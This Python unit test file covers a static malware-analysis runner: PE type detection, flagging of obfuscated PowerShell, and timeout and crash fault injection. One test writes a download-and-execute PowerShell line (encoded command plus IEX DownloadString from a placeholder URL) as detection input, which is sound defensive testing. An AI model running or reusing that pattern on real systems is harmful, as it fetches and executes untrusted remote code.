"""Unit tests for isolated static runner and timeout/fault injection."""

import subprocess
from pathlib import Path
from unittest.mock import patch

from sentinel.scan.static_runner import IsolatedStaticRunner


def test_isolated_pe_analysis(tmp_path: Path) -> None:
    pe_file = tmp_path / "sample.exe"
    # Write minimal fake MZ header
    data = bytearray(b"MZ" + b"\x00" * 200)
    pe_file.write_bytes(data)

    runner = IsolatedStaticRunner(timeout_s=5.0)
    res = runner.run_analysis(pe_file, original_filename="sample.exe", tool="all")

    assert res.status == "success"
    assert res.detected_type == "pe"
    assert not res.ext_mismatch


def test_isolated_script_analysis_detects_obfuscation(tmp_path: Path) -> None:
    ps_file = tmp_path / "script.ps1"
    ps_file.write_text(
        "powershell -encodedcommand AAAA ; IEX (New-Object Net.WebClient).DownloadString('http://x')"
    )

    runner = IsolatedStaticRunner(timeout_s=5.0)
    res = runner.run_analysis(ps_file, original_filename="script.ps1", tool="all")

    assert res.status == "success"
    assert res.detected_type == "script"
    assert "script_detected" in res.flags
    assert "powershell_iex" in res.flags or "powershell_encoded" in res.flags


def test_isolated_parser_timeout_fault_injection(tmp_path: Path) -> None:
    """Fault Injection: A hanging parser must be terminated at timeout threshold without crashing host."""
    test_file = tmp_path / "hang_trigger.bin"
    test_file.write_bytes(b"dummy")

    # Set ultra-short timeout and mock subprocess.run to raise TimeoutExpired
    runner = IsolatedStaticRunner(timeout_s=0.01)

    with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="test", timeout=0.01)):
        res = runner.run_analysis(test_file, original_filename="hang.bin")
        assert res.status == "timeout"
        assert "static_analysis_timeout" in res.flags
        assert "timed out" in (res.error_message or "")


def test_isolated_parser_crash_fault_injection(tmp_path: Path) -> None:
    """Fault Injection: A crashing parser (non-zero return code) must be trapped safely."""
    test_file = tmp_path / "crash_trigger.bin"
    test_file.write_bytes(b"dummy")

    runner = IsolatedStaticRunner(timeout_s=5.0)

    # Simulate worker process segfault or non-zero exit code
    mock_proc = subprocess.CompletedProcess(
        args=["mock"],
        returncode=139,  # SIGSEGV
        stdout="",
        stderr="Fatal error: Segmentation fault in native parser library",
    )

    with patch("subprocess.run", return_value=mock_proc):
        res = runner.run_analysis(test_file, original_filename="crash.bin")
        assert res.status == "error"
        assert "static_analysis_crash" in res.flags
        assert "Segmentation fault" in (res.error_message or "")
